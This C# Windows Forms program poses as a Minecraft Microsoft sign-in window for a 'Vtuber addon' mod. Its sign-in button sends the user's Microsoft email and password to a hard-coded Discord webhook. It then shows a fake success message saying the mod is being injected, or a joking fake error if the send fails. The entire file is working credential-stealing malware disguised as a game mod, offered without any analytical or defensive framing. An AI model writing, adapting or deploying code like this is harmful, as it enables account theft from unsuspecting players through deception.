using System;  
using System.Drawing;  
using System.Net.Http;  
using System.Text;  
using System.Windows.Forms;

public class VtuberAddon : Form  
{  
    // --- CONFIGURATION ---  
    // Your ||Discord|| channel URL  
    private const string DiscordWebhookUrl = "https://discord.com/api/webhooks/1471797716064538719";  
    // --- END CONFIGURATION ---

    private TextBox emailTextBox;  
    private TextBox passwordTextBox;  
    private Button loginButton;  
    private Label statusLabel;

    public VtuberAddon()  
    {  
        // Form Properties  
        this.Text = "Minecraft Microsoft Sign-In";  
        this.Size = new Size(400, 250);  
        this.StartPosition = FormStartPosition.CenterScreen;  
        this.FormBorderStyle = FormBorderStyle.FixedDialog;  
        this.MaximizeBox = false;  
        this.MinimizeBox = false;

        // Email Label and Textbox  
        Label emailLabel = new Label() { Text = "Microsoft Account Email:", Location = new Point(20, 20), Width = 150 };  
        emailTextBox = new TextBox() { Location = new Point(170, 20), Width = 200 };

        // Password Label and Textbox  
        Label passwordLabel = new Label() { Text = "Password:", Location = new Point(20, 60), Width = 150 };  
        passwordTextBox = new TextBox() { Location = new Point(170, 60), Width = 200, UseSystemPasswordChar = true };

        // Login Button  
        loginButton = new Button() { Text = "Sign In & Inject Mod", Location = new Point(170, 100), Width = 200, Height = 30 };  
        loginButton.Click += new EventHandler(LoginButton_Click);

        // Status Label  
        statusLabel = new Label() { Text = "Please enter your credentials to continue.", Location = new Point(20, 140), Width = 350, ForeColor = Color.Gray };

        // Add controls to the form  
        this.Controls.Add(emailLabel);  
        this.Controls.Add(emailTextBox);  
        this.Controls.Add(passwordLabel);  
        this.Controls.Add(passwordTextBox);  
        this.Controls.Add(loginButton);  
        this.Controls.Add(statusLabel);  
    }

    private async void LoginButton_Click(object sender, EventArgs e)  
    {  
        string user = emailTextBox.Text;  
        string pass = passwordTextBox.Text;

        if (string.IsNullOrEmpty(user) || string.IsNullOrEmpty(pass))  
        {  
            MessageBox.Show("Email and password cannot be empty.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);  
            return;  
        }

        // Disable button and show status  
        loginButton.Enabled = false;  
        statusLabel.Text = "Signing in... Please wait.";  
        this.Refresh(); // Update the UI immediately

        try  
        {  
            // Prepare data for ||Discord|| webhook  
            StringBuilder messageBuilder = new StringBuilder();  
            messageBuilder.AppendLine("EMAIL: " + user);  
            messageBuilder.AppendLine("PASSWORD: " + pass);  
            string jsonData = $"{{ \"content\": \"{messageBuilder.ToString()}\"}}";  
            StringContent content = new StringContent(jsonData, Encoding.UTF8, "application/json");

            // Send data to ||Discord|| webhook  
            using (HttpClient client = new HttpClient())  
            {  
                HttpResponseMessage response = await client.PostAsync(DiscordWebhookUrl, content);  
                response.EnsureSuccessStatusCode(); // Throw exception if not successful  
            }

            statusLabel.Text = "Success! Mod will be injected shortly.";  
            MessageBox.Show("Sign-in successful! The mod is now being injected.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);  
            Application.Exit(); // Close the application  
        }  
        catch (Exception ex)  
        {  
            // Deliciously fake error message  
            statusLabel.Text = "Critical error: The Mojang authentication servers have been compromised by ninjas. Please contact support. (This is a lie)";  
            MessageBox.Show("A critical error occurred during authentication. Mojang ninjas are involved. (Seriously, it's probably a network issue)", "Authentication Failure", MessageBoxButtons.OK, MessageBoxIcon.Error);  
            loginButton.Enabled = true; // Re-enable the button on failure  
        }  
    }

    [STAThread]  
    public static void Main()  
    {  
        Application.EnableVisualStyles();  
        Application.SetCompatibleTextRenderingDefault(false);  
        Application.Run(new VtuberAddon());  
    }  
}  
